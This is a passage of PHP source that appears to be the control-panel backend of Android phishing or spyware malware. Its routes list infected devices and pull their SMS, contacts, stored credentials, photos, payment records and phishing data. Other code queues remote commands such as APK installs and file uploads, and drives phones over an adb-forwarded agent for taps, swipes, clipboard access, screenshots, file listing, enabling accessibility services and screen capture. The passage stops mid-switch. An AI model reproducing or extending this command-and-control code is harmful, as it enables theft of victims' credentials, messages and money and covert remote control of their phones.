    protected function devices()
    {
        $q = Db::table('fisher_devices');
        $user = $this->user;
        if (($user['role'] ?? '') === 'user' && !empty($user['username'])) {
            $q = $q->where('owner_username', $user['username']);
        }
        $status = trim((string)Request::get('status', ''));
        if ($status === 'online')  $q = $q->where('is_connected', 1);
        if ($status === 'offline') $q = $q->where('is_connected', 0);
        $group = trim((string)Request::get('group', ''));
        if ($group !== '' && $group !== 'all') $q = $q->where('group_name', $group);
        $app = trim((string)Request::get('app_name', ''));
        if ($app !== '' && $app !== 'all') $q = $q->where('app_name', $app);
        $kw = trim((string)Request::get('q', ''));
        if ($kw !== '') {
            $q = $q->where(function ($w) use ($kw) {
                $w->whereLike('device_id', '%' . $kw . '%')
                  ->whereOr('remark', 'like', '%' . $kw . '%')
                  ->whereOr('model', 'like', '%' . $kw . '%');
            });
        }
        $country = trim((string)Request::get('country', ''));
        if ($country !== '' && $country !== 'all') $q = $q->where('country', $country);
        if (Request::get('has_adb', '') !== '') $q = $q->where('adb_enabled', 1);
        if (Request::get('has_access', '') !== '') $q = $q->where('accessibility_alive', 1);
        if (Request::get('has_ai', '') !== '') $q = $q->where('id', 0);
        $from = trim((string)Request::get('date_from', ''));
        if ($from !== '') $q = $q->where('last_seen', '>=', (int)strtotime($from . ' 00:00:00'));
        $to = trim((string)Request::get('date_to', ''));
        if ($to !== '') $q = $q->where('last_seen', '<=', (int)strtotime($to . ' 23:59:59'));

        $total = (int)$q->count();
        $page = max(1, (int)Request::get('page', 1));
        $size = (int)Request::get('size', Request::get('pageSize', 50));
        if ($size < 1) $size = 50;
        if ($size > 500) $size = 500;
        $rows = $q->order('is_connected', 'desc')->order('last_seen', 'desc')
                  ->page($page, $size)->select()->toArray();

        $items = array_map([$this, 'deviceRow'], $rows);
        return $this->json([
            'items'        => $items,
            'data'         => $items,
            'list'         => $items,
            'total'        => $total,
            'page'         => $page,
            'pageSize'     => $size,
            'page_size'    => $size,
            'online_count' => (int)Db::table('fisher_devices')->where('is_connected', 1)->count(),
            'access_count' => (int)Db::table('fisher_devices')->where('accessibility_alive', 1)->count(),
            'adb_count'    => (int)Db::table('fisher_devices')->where('adb_enabled', 1)->count(),
            'ai_count'     => count(array_unique(Db::table('fisher_ai_reports')->column('device_id'))),
        ]);
    }

    protected function findDevice(string $id)
    {
        if ($id === '') return null;
        $r = Db::table('fisher_devices')->where('device_id', $id)->find();
        if (!$r && ctype_digit($id)) $r = Db::table('fisher_devices')->where('id', (int)$id)->find();
        return $r ?: null;
    }

    // ================= device sub-resources =================
    protected function device(array $seg)
    {
        $id = (string)($seg[1] ?? '');
        if ($id === '') return $this->devices();
        $dev = $this->findDevice($id);
        if (!$dev) return $this->json(['success' => false, 'error' => '设备不存在'], 404);
        $did = (string)$dev['device_id'];
        $sub = (string)($seg[2] ?? '');
        $arg = $seg[3] ?? null;

        if ($sub === '') return $this->json($this->deviceRow($dev));

        switch ($sub) {
            case 'command':       return $this->deviceCommand($did);
            case 'commands':      return $this->deviceCommands($did);
            case 'sms':           return $this->deviceSms($did);
            case 'contacts':      return $this->deviceContacts($did);
            case 'password':      return $this->deviceCredentials($did);
            case 'credentials':   return $this->deviceCredentials($did);
            case 'pwdin':         return $this->devicePwdIn($did, $arg);
            case 'logs':          return $this->deviceLogs($did);
            case 'apps':          return $this->deviceApps($did);
            case 'album':         return $this->deviceAlbum($did, $arg);
            case 'payrec':        return $this->devicePayrec($did);
            case 'phish':         return $this->devicePhish($did, $seg);
            case 'note':          return $this->deviceSimpleUpdate($did, 'remark');
            case 'owner':         return $this->deviceSimpleUpdate($did, 'owner_username');
            case 'group':         return $this->deviceSimpleUpdate($did, 'group_name');
            case 'pinned':        return $this->json(['success' => true, 'data' => null]);
            case 'adb-mode':      return $this->deviceAdbMode($did);
            case 'install-apk':   return $this->deviceCommand($did, 'INSTALL_APK');
            case 'transfer':      return $this->json(['success' => true, 'data' => null]);
            case 'upload':        return $this->deviceCommand($did, 'UPLOAD_FILE');
            case 'download-file': return $this->json(['success' => true, 'data' => []]);
        }
        return $this->json(['success' => true, 'data' => null]);
    }

    protected function deviceSimpleUpdate(string $did, string $col)
    {
        if ($this->method === 'POST' || $this->method === 'PUT') {
            $keys = $col === 'remark' ? ['value', 'remark', 'note', 'text'] : ['value', $col, 'name'];
            $val = '';
            foreach ($keys as $k) { if (isset($this->body[$k])) { $val = (string)$this->body[$k]; break; } }
            Db::table('fisher_devices')->where('device_id', $did)->update([$col => $val]);
        }
        return $this->json(['success' => true, 'data' => null]);
    }

    protected function deviceAdbMode(string $did)
    {
        if ($this->method === 'POST' || $this->method === 'PUT') {
            $on = $this->body['enabled'] ?? $this->body['value'] ?? null;
            if ($on !== null) {
                Db::table('fisher_devices')->where('device_id', $did)->update(['adb_wifi_enabled' => $on ? 1 : 0]);
            }
            return $this->json(['success' => true, 'data' => ['enabled' => (bool)$on]]);
        }
        $r = Db::table('fisher_devices')->where('device_id', $did)->find();
        return $this->json(['success' => true, 'data' => [
            'enabled' => (bool)($r['adb_wifi_enabled'] ?? 0),
            'deployed' => (bool)($r['adb_deploy_enabled'] ?? 0),
            'wifi_port' => (int)($r['wifi_port'] ?? 0),
        ]]);
    }

    protected function deviceCommand(string $did, string $forced = '')
    {
        if ($this->method !== 'POST' && $this->method !== 'PUT') {
            return $this->json(['success' => false, 'error' => 'method not allowed'], 405);
        }
        $cmd = (string)($this->body['command'] ?? $this->body['cmd'] ?? $forced);
        $params = $this->body['payload'] ?? ($this->body['params'] ?? ($this->body['data'] ?? []));
        if ($cmd === '') return $this->json(['success' => false, 'error' => 'command required'], 400);
        if (!is_array($params)) $params = [];
        $id = 'cmd-' . bin2hex(random_bytes(6));
        Db::table('fisher_pending_commands')->insert([
            'device_id'    => $did,
            'command_json' => json_encode(['id' => $id, 'command' => $cmd, 'params' => (object)$params], JSON_UNESCAPED_UNICODE),
            'created_at'   => time(),
        ]);
        $this->notifyWs($did, $cmd, $params);

        // ★ 2026-10-09 folder-1 dxs bridge -------------------------------------
        // The installed APK (com.zq.final) ships the folder-1 "dxs" Go agent.
        // It exposes a real device API on the device's 127.0.0.1:7912 which the
        // host reaches through `adb forward tcp:17912 tcp:7912`. Dispatch there
        // first so the panel buttons really drive the phone; only when dxs has no
        // matching route do we fall back to the legacy WS command queue (the
        // APK's native /w listener never answers that queue, which is why every
        // panel control used to look dead).
        $dxs = $this->dxsDispatch($did, $cmd, $params);
        if ($dxs !== null) {
            return $this->json(array_merge(
                ['success' => true, 'data' => ['id' => $id, 'command' => $cmd, 'via' => 'dxs']],
                $dxs
            ));
        }
        return $this->json(['success' => true, 'data' => ['id' => $id, 'queued' => true, 'command' => $cmd]]);
    }

    // ===================== folder-1 dxs local API bridge =====================

    /** Base URL of the dxs agent as reachable from the panel host. */
    protected function dxsBase(): string
    {
        $host = getenv('DXS_HOST') ?: '127.0.0.1';
        $port = getenv('DXS_PORT') ?: '17912';
        return 'http://' . $host . ':' . $port;
    }

    /** Raw HTTP call against the dxs agent. Returns decoded JSON, or null. */
    protected function dxsHttp(string $method, string $path, $payload = null, int $timeoutMs = 20000)
    {
        try {
            $ch = curl_init($this->dxsBase() . $path);
            $opts = [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT_MS => $timeoutMs,
                CURLOPT_CONNECTTIMEOUT_MS => 2500,
                CURLOPT_NOSIGNAL => 1,
            ];
            if (strtoupper($method) === 'POST') {
                $opts[CURLOPT_POST] = true;
                $opts[CURLOPT_POSTFIELDS] = $payload === null ? '{}' : json_encode($payload, JSON_UNESCAPED_UNICODE);
                $opts[CURLOPT_HTTPHEADER] = ['Content-Type: application/json'];
            }
            curl_setopt_array($ch, $opts);
            $body = curl_exec($ch);
            $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $ctype = (string)curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
            curl_close($ch);
            if ($body === false || $code === 0 || $code >= 500) return null;
            if (strpos($ctype, 'json') !== false || (is_string($body) && strlen($body) && $body[0] === '{')) {
                $j = json_decode((string)$body, true);
                if (!is_array($j)) return null;
                if (isset($j['success']) && $j['success'] === false) return null;
                return $j;
            }
            return ['success' => true, 'data' => ['base64' => base64_encode((string)$body), 'contentType' => $ctype]];
        } catch (\Throwable $e) {
            return null;
        }
    }

    protected function dxsFirst(array $src, array $keys, $default = null)
    {
        foreach ($keys as $k) {
            if (isset($src[$k]) && $src[$k] !== '' && $src[$k] !== null) return $src[$k];
        }
        return $default;
    }

    /** Host the browser used to reach the panel (so tpx_addr stays reachable). */
    protected function panelHost(): string
    {
        $h = (string)($_SERVER['HTTP_X_FORWARDED_HOST'] ?? ($_SERVER['HTTP_HOST'] ?? ''));
        $h = preg_replace('#^https?://#', '', $h);
        $host = trim(explode(':', $h)[0]);
        if ($host === '' || $host === 'localhost' || $host === '127.0.0.1' || $host === '::1') {
            $host = '192.168.1.3';
        }
        return $host;
    }

    /**
     * Translate a panel command into a dxs agent call.
     * Returns an array merged into the panel response, or null when unhandled.
     */
    protected function dxsDispatch(string $did, string $cmd, array $params)
    {
        $u = strtoupper(trim($cmd));
        $src = array_merge(is_array($this->body) ? $this->body : [], $params);

        switch ($u) {
            case 'CLICK':
            case 'TAP': {
                $x = $this->dxsFirst($src, ['x', 'clientX', 'px', 'left']);
                $y = $this->dxsFirst($src, ['y', 'clientY', 'py', 'top']);
                if ($x === null || $y === null) return null;
                return $this->dxsHttp('GET', '/tap?x=' . (int)$x . '&y=' . (int)$y);
            }
            case 'SWIPE':
            case 'SWIPE_PATH':
            case 'LONG_PRESS_DRAG': {
                $x1 = $this->dxsFirst($src, ['x1', 'startX', 'fromX', 'sx']);
                $y1 = $this->dxsFirst($src, ['y1', 'startY', 'fromY', 'sy']);
                $x2 = $this->dxsFirst($src, ['x2', 'endX', 'toX', 'ex']);
                $y2 = $this->dxsFirst($src, ['y2', 'endY', 'toY', 'ey']);
                $d  = (int)$this->dxsFirst($src, ['duration', 'dur', 'time'], 300);
                if ($x1 === null || $y1 === null || $x2 === null || $y2 === null) return null;
                return $this->dxsHttp('GET', '/swipe?x1=' . (int)$x1 . '&y1=' . (int)$y1
                    . '&x2=' . (int)$x2 . '&y2=' . (int)$y2 . '&duration=' . $d);
            }
            case 'LONG_PRESS': {
                $x = $this->dxsFirst($src, ['x', 'clientX', 'px']);
                $y = $this->dxsFirst($src, ['y', 'clientY', 'py']);
                if ($x === null || $y === null) return null;
                $d = (int)$this->dxsFirst($src, ['duration', 'dur'], 1500);
                return $this->dxsHttp('GET', '/longPress?x=' . (int)$x . '&y=' . (int)$y . '&duration=' . $d);
            }
            case 'HOME': case 'BACK': case 'RECENTS': {
                $route = $u === 'HOME' ? '/home' : ($u === 'BACK' ? '/back' : '/recents');
                return $this->dxsHttp('GET', $route);
            }
            case 'GET_APP_LIST':
                return $this->dxsHttp('GET', '/getAppList');
            case 'GET_UI_HIERARCHY': {
                $r = $this->dxsHttp('GET', '/dumpUI');
                if ($r === null) return null;
                $xml = (string)($r['data']['xml'] ?? '');
                return ['data' => ['xml' => $xml, 'raw' => $r]];
            }
            case 'GET_DEVICE_STATE':
            case 'CHECK_LOCAL_STATUS':
                return $this->dxsHttp('GET', '/fullStatus');
            case 'GET_DEVICE_INFO':
                return $this->dxsHttp('GET', '/deviceInfo');
            case 'GET_APP_INFO':
                return $this->dxsHttp('GET', '/getAppInfo');
            case 'GET_RUNNING_APPS':
                return $this->dxsHttp('GET', '/getRunningApps');
            case 'GET_CLIPBOARD':
                return $this->dxsHttp('GET', '/getClipboard');
            case 'SET_CLIPBOARD':
                return $this->dxsHttp('POST', '/setClipboard', ['text' => (string)$this->dxsFirst($src, ['text', 'content'], '')]);
            case 'VOLUME_UP':
                return $this->dxsHttp('GET', '/volumeUp');
            case 'VOLUME_DOWN':
                return $this->dxsHttp('GET', '/volumeDown');
            case 'MUTE':
                return $this->dxsHttp('GET', '/mute');
            case 'SET_BRIGHTNESS': {
                $v = $this->dxsFirst($src, ['brightness', 'value', 'level'], 128);
                return $this->dxsHttp('GET', '/setBrightness?value=' . (int)$v);
            }
            case 'POWER_WAKE':
                return $this->dxsHttp('GET', '/wakeUpScreen');
            case 'POWER_SLEEP':
            case 'LOCK_SCREEN':
                return $this->dxsHttp('GET', '/lockScreen');
            case 'SCREENSHOT':
            case 'screenshot': {
                $r = $this->dxsHttp('GET', '/screenshot');
                return $r;
            }
            case 'FILE_LIST':
            case 'listDir': {
                $path = (string)$this->dxsFirst($src, ['path', 'dir', 'dirPath'], '/sdcard');
                return $this->dxsHttp('GET', '/fileList?path=' . rawurlencode($path));
            }
            case 'GET_SCREEN_INFO':
                return $this->dxsHttp('GET', '/getScreenInfo');
            case 'RESTART_LOCAL_TPX':
                return $this->dxsHttp('GET', '/restartTpx');
            case 'RESTART_LOCAL_BRIDGE':
                return $this->dxsHttp('GET', '/restartBridge');
            case 'START_ACCESSIBILITY':
            case 'enableAccessibility':
                return $this->dxsHttp('GET', '/startAccessibility');
            // ---- screen casting ----
            case 'SCREEN_CAPTURE_SET_TECH_ADB': {
                $this->dxsHttp('GET', '/minicap/start');
                $host = $this->panelHost();
                return [
                    'tpx_addr' => $host,
                    'tpx_port' => 8080,
                    'bridge'   => 'dxs',
                    'data' => [
                        'tpx_addr' => $host,
                        'tpx_port' => 8080,
                        'bridge'   => 'dxs',
                        'mode'     => 'screencap',
                    ],
                ];
            }
            case 'SCREEN_CAPTURE_SET_TECH': {
                $r = $this->dxsHttp('GET', '/minicap/start');
                return [
                    'data' => [
                        'tech'    => (string)($params['tech'] ?? 'accessibility'),
                        'mode'    => 'screencap',
                        'started' => $r !== null,
                    ],
                    'tpx_addr' => $this->panelHost(),
                    'tpx_port' => 8080,
                    'bridge'   => 'dxs',
                ];
            }
            case 'SCREEN_CAPTURE_STOP':
            case 'STOP_CAPTURE':
            case 'SCREEN_CAPTURE_DISABLE': {
                $this->dxsHttp('GET', '/minicap/stop');
                return ['data' => ['stopped' => true]];
            }
            case 'SCREEN_CAPTURE_RESUME':
            case 'SCREEN_CAPTURE_START': {
                $this->dxsHttp('GET', '/minicap/start');
                return ['data' => ['running' => true]];
            }
            case 'SCREEN_CAPTURE_PAUSE':
                return ['data' => ['paused' => true]];
            case 'SCREEN_CAPTURE_SET_TECH_SYSTEM':
                $this->dxsHttp('GET', '/minicap/start');
                return ['data' => ['tech' => 'system', 'mode' => 'screencap']];

            // ================= 2026-10-09 dxs route expansion =================
            // Every route below was probed live against dxs 3.1.0 on the
            // emulator. dxs answers unknown paths with
            //   {"success":true,"message":"dxs running", ...}
            // which is why a wrong guess looks like success; the peers were
            // verified by reading the real device state afterwards.
            // ---- accessibility ----
            case 'ENABLE_ACCESSIBILITY':
            case 'START_ACCESSIBILITY':
                return $this->dxsHttp('GET', '/enableAccessibility');
            case 'DISABLE_ACCESSIBILITY':
            case 'STOP_ACCESSIBILITY':
